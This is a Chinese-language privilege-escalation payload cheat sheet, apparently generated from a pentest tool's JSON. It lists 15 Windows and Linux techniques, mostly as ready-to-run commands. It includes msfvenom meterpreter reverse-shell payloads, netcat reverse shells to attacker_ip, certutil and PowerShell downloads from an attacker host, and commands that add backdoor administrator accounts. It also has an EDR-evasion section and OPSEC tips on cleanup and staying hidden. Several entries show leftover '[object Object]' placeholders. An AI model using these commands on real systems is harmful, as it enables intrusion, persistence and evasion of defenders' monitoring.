# 权限提升 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（15 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 令牌窃取与模拟

- **id:** `privilege-token`
- **分类:** 权限提升 / 令牌操作
- **tags:** `token` `privilege` `impersonation` `windows`

窃取和模拟Windows访问令牌

**前置条件**

- 已获得目标机器权限
- SeImpersonatePrivilege权限
- Windows系统

**利用步骤**

#### 列出令牌

```
mimikatz.exe "privilege::debug" "token::list" "exit"
```

列出系统中所有可用令牌

> platform: `windows`

#### 窃取令牌

```
mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
```

窃取指定用户的令牌

> platform: `windows`

#### JuicyPotato攻击

```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

JuicyPotato提权（需要SeImpersonatePrivilege）

| 片段 | 说明 | 类型 |
|---|---|---|
| `JuicyPotato.exe` | DCOM DCE/RPC本地提权工具 | command |
| `-l` | 监听端口 | parameter |
| `-p` | 要执行的程序 | parameter |
| `-c` | CLSID | parameter |

> platform: `windows`

#### PrintSpoofer

```
PrintSpoofer.exe -i -c cmd
```

PrintSpoofer提权

> platform: `windows`

#### GodPotato

```
GodPotato.exe -cmd "cmd /c whoami"
```

GodPotato提权，支持更多Windows版本

> platform: `windows`

**EDR 绕过**

#### RoguePotato

```
RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
```

RoguePotato，绕过更多限制

**OPSEC**

- Potato系列工具利用DCOM机制
- 需要SeImpersonatePrivilege权限
- 不同Windows版本需要不同的CLSID

**教程**

[object Object]

---

### 2. Windows权限提升

- **id:** `windows-privesc`
- **分类:** 权限提升 / Windows
- **tags:** `privesc` `windows` `privilege`

Windows系统提权技术

**前置条件**

- 普通用户权限
- 系统漏洞

**利用步骤**

#### 检查提权向量

```
whoami /priv
whoami /groups
```

检查当前权限

> platform: `windows`

#### 使用WinPEAS

```
winpeas.exe
```

自动化提权检查

> platform: `windows`

#### 检查服务权限

```
accesschk.exe -uwcqv "Everyone" *
```

检查可写服务

> platform: `windows`

#### 检查未引用服务路径

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
```

查找未引用服务路径

> platform: `windows`

**教程**

[object Object]

---

### 3. Linux权限提升

- **id:** `linux-privesc`
- **分类:** 权限提升 / Linux
- **tags:** `privesc` `linux` `privilege`

Linux系统提权技术

**前置条件**

- 普通用户权限
- 系统漏洞

**利用步骤**

#### 检查SUID

```
find / -perm -4000 -type f 2>/dev/null
```

查找SUID文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `find /` | 从根目录开始搜索 | keyword |
| `-perm -4000` | SUID权限位 | parameter |
| `-type f` | 只搜索文件 | parameter |

> platform: `linux`

#### 检查Sudo

```
sudo -l
```

检查sudo权限

> platform: `linux`

#### 检查Cron

```
cat /etc/crontab
ls -la /etc/cron*
```

检查计划任务

> platform: `linux`

#### 使用LinPEAS

```
linpeas.sh
```

自动化提权检查

> platform: `linux`

**教程**

[object Object]

---

### 4. UAC绕过

- **id:** `uac-bypass`
- **分类:** 权限提升 / UAC
- **tags:** `uac` `bypass` `windows`

绕过Windows用户账户控制

**前置条件**

- 管理员组成员
- UAC启用

**利用步骤**

#### Fodhelper

```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
fodhelper.exe
```

通过fodhelper绕过UAC

> platform: `windows`

#### Eventvwr

```
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe
```

通过eventvwr绕过UAC

> platform: `windows`

#### 使用UACME

```
Akagi64.exe 23 cmd.exe
```

使用UACME工具

> platform: `windows`

**教程**

[object Object]

---

### 5. DLL劫持

- **id:** `dll-hijack`
- **分类:** 权限提升 / DLL
- **tags:** `dll` `hijack` `privesc`

通过DLL劫持提权

**前置条件**

- 可写目录
- DLL搜索顺序

**利用步骤**

#### 查找DLL劫持

```
使用Procmon监控DLL加载
```

监控进程加载的DLL

> platform: `windows`

#### 创建恶意DLL

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

生成恶意DLL

> platform: `linux`

#### 放置DLL

```
copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```

放置DLL到目标位置

> platform: `windows`

**教程**

[object Object]

---

### 6. 服务提权

- **id:** `service-exploit`
- **分类:** 权限提升 / 服务
- **tags:** `service` `privesc` `windows`

通过服务漏洞提权

**前置条件**

- 服务修改权限
- 可写服务路径

**利用步骤**

#### 检查服务权限

```
accesschk.exe -uwcqv "Users" *
```

检查用户可修改的服务

> platform: `windows`

#### 修改服务路径

```
sc config VulnerableService binPath= "cmd /c whoami"
```

修改服务执行路径

> platform: `windows`

#### 重启服务

```
sc stop VulnerableService
sc start VulnerableService
```

重启服务执行命令

> platform: `windows`

**教程**

[object Object]

---

### 7. AlwaysInstallElevated提权

- **id:** `always-install`
- **分类:** 权限提升 / MSI
- **tags:** `msi` `alwaysinstall` `privesc`

利用AlwaysInstallElevated提权

**前置条件**

- AlwaysInstallElevated启用

**利用步骤**

#### 检查设置

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

检查是否启用

> platform: `windows`

#### 创建MSI

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
```

生成恶意MSI

> platform: `linux`

#### 安装MSI

```
msiexec /quiet /qn /i evil.msi
```

安装MSI执行代码

> platform: `windows`

**教程**

[object Object]

---

### 8. Juicy Potato提权

- **id:** `juicy-potato`
- **分类:** 权限提升 / Potato
- **tags:** `juicy-potato` `com` `privesc`

利用COM对象和SeImpersonatePrivilege提权

**前置条件**

- SeImpersonatePrivilege
- Windows < 2019

**利用步骤**

#### 检查权限

```
whoami /priv | findstr SeImpersonate
```

检查SeImpersonatePrivilege

> platform: `windows`

#### 执行JuicyPotato

```
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

使用JuicyPotato提权

| 片段 | 说明 | 类型 |
|---|---|---|
| `-t *` | 创建进程类型 | parameter |
| `-p cmd.exe` | 要执行的程序 | parameter |
| `-l 1337` | 监听端口 | parameter |

> platform: `windows`

**教程**

[object Object]

---

### 9. PrintSpoofer提权

- **id:** `printspoofer`
- **分类:** 权限提升 / PrintSpoofer
- **tags:** `printspoofer` `privesc` `windows`

利用打印机服务提权

**前置条件**

- SeImpersonatePrivilege

**利用步骤**

#### 执行PrintSpoofer

```
PrintSpoofer.exe -i -c cmd
```

使用PrintSpoofer提权

> platform: `windows`

#### 指定命令

```
PrintSpoofer.exe -c "whoami > C:\out.txt"
```

执行指定命令

> platform: `windows`

**教程**

[object Object]

---

### 10. GodPotato提权

- **id:** `godpotato`
- **分类:** 权限提升 / GodPotato
- **tags:** `godpotato` `privesc` `windows`

GodPotato提权工具

**前置条件**

- SeImpersonatePrivilege

**利用步骤**

#### 执行GodPotato

```
GodPotato.exe -cmd "cmd /c whoami"
```

使用GodPotato提权

> platform: `windows`

#### 反向Shell

```
GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
```

执行反向Shell

> platform: `windows`

**教程**

[object Object]

---

### 11. SUID提权

- **id:** `suid-exploit`
- **分类:** 权限提升 / SUID
- **tags:** `suid` `privesc` `linux`

利用SUID文件提权

**前置条件**

- 存在SUID文件
- 可利用程序

**利用步骤**

#### 查找SUID

```
find / -perm -4000 -type f 2>/dev/null
```

查找所有SUID文件

> platform: `linux`

#### 常见可利用程序

```
nmap --interactive
vim -c ':!/bin/sh'
find / -exec /bin/sh \;
cp /bin/sh /tmp/sh; chmod +s /tmp/sh
```

常见SUID利用方法

> platform: `linux`

#### GTFOBins

```
参考GTFOBins网站查找可利用程序
```

查找程序利用方法

> platform: `linux`

**教程**

[object Object]

---

### 12. Sudo提权

- **id:** `sudo-exploit`
- **分类:** 权限提升 / Sudo
- **tags:** `sudo` `privesc` `linux`

利用Sudo配置提权

**前置条件**

- Sudo权限配置不当

**利用步骤**

#### 检查Sudo权限

```
sudo -l
```

列出可执行的sudo命令

> platform: `linux`

#### 常见利用

```
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
```

常见sudo利用方法

> platform: `linux`

#### CVE-2021-3156

```
利用sudo堆溢出漏洞
```

Baron Samedit漏洞

> platform: `linux`

**教程**

[object Object]

---

### 13. Cron提权

- **id:** `cron-exploit`
- **分类:** 权限提升 / Cron
- **tags:** `cron` `privesc` `linux`

利用Cron任务提权

**前置条件**

- 可写Cron脚本
- 通配符注入

**利用步骤**

#### 检查Cron任务

```
cat /etc/crontab
ls -la /etc/cron*
```

查看计划任务

> platform: `linux`

#### 检查脚本权限

```
ls -la /path/to/cron/script.sh
```

检查Cron脚本权限

> platform: `linux`

#### 通配符注入

```
在Cron目录创建: --checkpoint=1
--checkpoint-action=exec=sh shell.sh
```

利用tar通配符注入

> platform: `linux`

**教程**

[object Object]

---

### 14. 内核漏洞提权

- **id:** `kernel-exploit`
- **分类:** 权限提升 / 内核
- **tags:** `kernel` `privesc` `exploit`

利用内核漏洞提权

**前置条件**

- 存在内核漏洞
- 可编译/执行exploit

**利用步骤**

#### 检查内核版本

```
uname -a
cat /proc/version
```

查看内核版本信息

> platform: `linux`

#### 搜索exploit

```
searchsploit kernel VERSION
```

搜索内核exploit

> platform: `linux`

#### 常见内核漏洞

```
DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)
```

常见内核提权漏洞

> platform: `linux`

**教程**

[object Object]

---

### 15. Potato系列提权攻击

- **id:** `potato-attack`
- **分类:** 权限提升 / Potato提权
- **tags:** `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`

利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM

**前置条件**

- 拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限
- 常见于IIS AppPool、SQL Server、各类服务账户

**利用步骤**

#### 检查当前权限

```
# 检查是否拥有Impersonate权限
whoami /priv

# 重点关注以下权限:
# SeImpersonatePrivilege - 模拟客户端令牌
# SeAssignPrimaryTokenPrivilege - 替换进程级令牌

# 确认当前用户身份
whoami /all
echo %USERNAME%
```

首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限

| 片段 | 说明 | 类型 |
|---|---|---|
| `whoami /priv` | 列出当前用户所有特权 | command |
| `SeImpersonatePrivilege` | 允许模拟其他用户令牌的关键特权 | value |
| `SeAssignPrimaryTokenPrivilege` | 允许为新进程分配令牌 | value |

> platform: `windows`

#### JuicyPotato (Windows Server 2016/2019)

```
# 下载JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# 使用JuicyPotato提权执行命令
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# 使用特定CLSID (不同系统需要不同CLSID)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 反弹Shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
```

JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `-l 1337` | COM服务器监听端口 | parameter |
| `-p` | 要以SYSTEM权限执行的程序 | parameter |
| `-a` | 传递给程序的参数 | parameter |
| `-t *` | 同时尝试CreateProcessWithToken和CreateProcessAsUser | parameter |
| `-c {CLSID}` | 指定COM对象CLSID(需匹配目标系统版本) | parameter |

> platform: `windows`

#### PrintSpoofer (Windows 10/Server 2019+)

```
# PrintSpoofer - 利用打印服务命名管道
PrintSpoofer.exe -i -c cmd

# 直接执行命令
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# 反弹Shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# 以SYSTEM身份启动PowerShell
PrintSpoofer.exe -i -c powershell.exe
```

PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows

| 片段 | 说明 | 类型 |
|---|---|---|
| `-i` | 交互模式(获取交互式Shell) | parameter |
| `-c cmd` | 以SYSTEM权限执行的命令 | parameter |

> platform: `windows`

#### Sweet Potato (多技术集成)

```
# SweetPotato - 集成多种Potato技术
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# 指定攻击方式
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
```

SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式

| 片段 | 说明 | 类型 |
|---|---|---|
| `-e EfsRpc` | 指定使用EFS RPC攻击向量 | parameter |
| `-p` | 要执行的程序路径 | parameter |

> platform: `windows`

#### GodPotato (全版本通杀)

```
# GodPotato - 适用于Windows Server 2012-2022所有版本
GodPotato.exe -cmd "cmd /c whoami"

# 执行反弹Shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# 添加管理员
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# 执行PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种

| 片段 | 说明 | 类型 |
|---|---|---|
| `-cmd` | 以SYSTEM权限执行的命令 | parameter |
| `GodPotato.exe` | 全版本兼容的Potato提权工具 | command |

> platform: `windows`

#### RoguePotato (远程场景)

```
# 攻击机 - 启动socat重定向
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# 目标机 - 执行RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# 或使用netcat反弹
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```

RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继

| 片段 | 说明 | 类型 |
|---|---|---|
| `-r attacker_ip` | 攻击机IP(运行OXID解析器) | parameter |
| `-l 9999` | 本地监听端口 | parameter |
| `-e` | 要执行的命令 | parameter |

> platform: `windows`

#### Potato选型决策流程

```
# === 决策流程 ===
# 1. whoami /priv 确认SeImpersonatePrivilege
# 2. systeminfo 确认系统版本
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
# Windows Server 2022 => GodPotato
# 所有版本 => SweetPotato (自动选择)
# 需要远程中继 => RoguePotato
#
# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/
```

根据目标系统版本选择合适的Potato变种工具

> platform: `windows`

**EDR 绕过**

#### 绕过EDR检测的Potato技巧

```
# 1. 重命名二进制文件
ren GodPotato.exe svcutil.exe

# 2. 使用.NET反射加载(无文件落地)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. 使用SharpToken替代(较新工具,签名较少)
SharpToken.exe execute SYSTEM "cmd /c whoami"
```

通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测

> platform: `windows`

**OPSEC**

- 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式

**教程**

[object Object]

**参考**

- https://attack.mitre.org/techniques/T1134/001/
- https://github.com/BeichenDream/GodPotato
